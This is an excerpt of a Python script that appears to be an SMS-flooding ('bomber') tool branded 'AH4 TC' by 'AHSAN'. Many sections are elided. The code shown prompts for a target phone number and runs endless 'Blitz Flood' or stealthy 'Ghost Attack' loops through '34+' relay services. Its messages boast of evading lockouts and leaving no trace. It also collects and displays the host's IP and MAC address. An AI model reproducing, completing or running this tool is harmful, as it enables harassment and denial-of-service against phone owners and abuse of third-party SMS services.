...
_c = {
    ...
    'u': '\033[4m', 'e': '\033[0m', 'R': '\033[31m', 'W': '\033[37m'
}
...
def _sig_handler_1(signum, frame):
    global _state
    _state['exit'] = True
    print(f"\n\n{_c['r']}🛑 SYSTEM HALTED BY OPERATOR!{_c['e']}")
    print(f"{_c['w']}💀 Logs Purged. Total requests: {_state['total']}{_c['e']}")
    print(f"{_c['r']}✅ Successful Breaches: {_state['success']}{_c['e']}")
    print(f"{_c['B']}{_c['r']}AH4 TC | AHSAN{_c['e']}")
    sys.exit(0)

def _sig_handler_2(signum, frame):
    global _state
    _state['paused'] = not _state['paused']
    status = "⏸ SUSPENDED" if _state['paused'] else "▶ RESUMED"
    color = _c['r'] if _state['paused'] else _c['w']
    print(f"\n{color}PROCESS {status}{_c['e']}")
...
def _get_device_info():
    try:
        ...
        return {
            ...
            "processor": processor, "mac": mac
        }
    except Exception:
        return {
            "hostname": "Unknown", "ip": "127.0.0.1", "system": "Unknown", "release": "Unknown",
            "processor": "Unknown", "mac": "00:00:00:00:00:00"
        }
...
def _print_banner():
    ...
    banner_lines = [
        ...
        f"{_c['w']}├─ hostname:  {_c['r']}{device_info['hostname']}{_c['e']}",
        f"{_c['w']}├─ ipv4:      {_c['r']}{device_info['ip']}{_c['e']}",
        f"{_c['w']}├─ mac:       {_c['r']}{device_info['mac']}{_c['e']}",
        f"{_c['w']}├─ cpu:       {_c['r']}{device_info['processor']}{_c['e']}",
        f"{_c['w']}└─ kernel:    {_c['r']}{device_info['system']} {device_info['release']}{_c['e']}",
        f"\n{_c['w']}{'=' * 80}",
        f"{_c['r']}SIGINT: Halt  {_c['w']}SIGTSTP: Suspend{_c['e']}",
        f"{_c['r']}Created by AHSAN. Our democracy has been hacked.{_c['e']}",
        f"{_c['w']}{'=' * 80}{_c['e']}"
    ]
...
def _animate_loading(text, duration=2):
    ...
    while time.time() < end_time:
        ...
        sys.stdout.write(f'\r{_c["r"]}[{_c["w"]}{frame}{_c["r"]}] {text}...{_c["e"]}')
        sys.stdout.flush()
        time.sleep(0.15)
        i += 1
    print(f'\r{_c["r"]}[{_c["w"]}✓{_c["r"]}] {text} success.{_c["e"]}')
...
class _ServiceManager:
    ...
    def _log_request(self, service_name, status, response, phone_used):
        ...
        status_text = "SUCCESS" if status == 200 else "FAILED"
        print(f"{_c['r']}[{_c['w']}packet:{_state['total']}{_c['r']}] {_c['w']}RELAY >> {service_name}{_c['e']}")
        print(f"{_c['r']}[target] {_c['w']}{phone_used}{_c['e']}")
        print(f"{_c['r']}[status] {status_color}{status_text} ({status}){_c['e']}")
        print(f"{_c['r']}[buffer] {_c['w']}{str(response)[:60]}...{_c['e']}")
        print(f"{_c['r']}{'-' * 45}{_c['e']}")
    ...
    async def _run_all_services_slowly(self):
        print(f"\n{_c['r']}🚀 INITIALIZING GHOST PROTOCOL SEQUENCE{_c['e']}")
        print(f"{_c['w']}⚡ 34+ Relays engaged. Sequential packet delivery active.{_c['e']}")
        print(f"{_c['r']}💥 Ghost frequency engaged. Undetectable pressure.{_c['e']}")
        ...
        async with aiohttp.ClientSession(
            ...
            print(f"{_c['r']}[GHOST NODE] Cycling through 34+ relays sequentially...{_c['e']}")
...
async def _main():
    ...
    while True:
        ...
        if mode_choice == "1":
            _current_mode = 'slow'
            print(f"{_c['w']}✅ GHOST MODE ACTIVE - Executing stealth sequence{_c['e']}")
            break
        elif mode_choice == "2":
            _current_mode = 'fast'
    ...
    while True:
        phone_input = input(f"\n{_c['r']}[TARGET] Enter node address (Phone): {_c['w']}").strip()
    ...
    if _current_mode == 'fast':
        ...
        print(f"{_c['r']}⚠️  Sustained flood will continue until HALT command (CTRL+C).{_c['e']}")
        print(f"{_c['w']}🔥 34+ Attack Nodes × 3 waves × parallel = MAXIMUM PRESSURE!{_c['e']}")
        print(f"{_c['r']}📱 Targeted Infrastructure: Mobile Network Gateways{_c['e']}")
        print(f"{_c['w']}⚡ High-speed packet injection in progress.{_c['e']}")
        print(f"{_c['r']}💥 LEAVE NO TRACE.{_c['e']}")
    else:
        print(f"\n{_c['r']}⚠️  PROTOCOL WARNING: STEALTH BOMBING!{_c['e']}")
        print(f"{_c['r']}⚠️  Sequential packet relay will continue until HALT command (CTRL+C).{_c['e']}")
        print(f"{_c['w']}🔄 34+ Attack Nodes × 5 packets each × low frequency = GHOST ATTACK!{_c['e']}")
        print(f"{_c['r']}📱 Optimized for persistent pressure without node lockout.{_c['e']}")
        print(f"{_c['w']}⚡ Precise execution using various protocol formats.{_c['e']}")
        print(f"{_c['r']}💥 CONTROLLED POWER.{_c['e']}")
    print(f"{_c['r']}{'=' * 60}{_c['e']}")
    ...
    try:
        while True:
            ...
            print(f"\n{_c['r']}{_c['B']}[SEQUENCE CYCLE #{cycle_count}] {_c['w']}{current_time}{_c['e']}")
            print(f"{_c['r']}[NODE] {_c['w']}{phone_data['with_0']}{_c['e']}")
            print(f"{_c['r']}[PAYLOADS] {_c['w']}{_state['total']}{_c['e']}")
            print(f"{_c['r']}[EFFICIENCY] {_c['w']}{(_state['success']/max(_state['total'],1)*100):.1f}%{_c['e']}")
            ...
            attack_type = "Blitz Flood" if _current_mode == 'fast' else "Ghost Attack"
            print(f"\n{_c['w']}[SEQUENCE END] {attack_type} Cycle #{cycle_count} completed.{_c['e']}")
            print(f"{_c['r']}[RUNTIME] {_c['w']}{elapsed/60:.1f} minutes{_c['e']}")
            print(f"{_c['r']}[IMPACT] {_c['w']}{_state['total']} packets delivered to target nodes.{_c['e']}")
            
            # Cooldown with animation
            print(f"{_c['r']}[WAIT] Re-calculating next wave in:{_c['e']}")
            for i in range(_cfg[1], 0, -1):  # LOOP_DELAY = 3
                if _state['exit'] or _state['paused']:
                    break
                frame = _frames[i % len(_frames)]
                sys.stdout.write(f'\r{_c["r"]}[{frame}] Wave reset in {i}s...{_c["e"]}')
                sys.stdout.flush()
                time.sleep(1)
...
if __name__ == "__main__":
    print(f"{_c['r']}🚀 Initializing AH4 TC relay nodes...{_c['e']}")
    print(f"{_c['w']}📱 System: Cross-Platform Protocol Support{_c['e']}")
    print(f"{_c['r']}Author: AHSAN | f s o c i e t y{_c['e']}\n")
    ...
    try:
        ...
        print(f"\n{_c['r']}💥 CORE PROTOCOL FAILURE: {e}{_c['e']}")
        print(f"{_c['w']}Consult AHSAN for technical documentation.{_c['e']}")
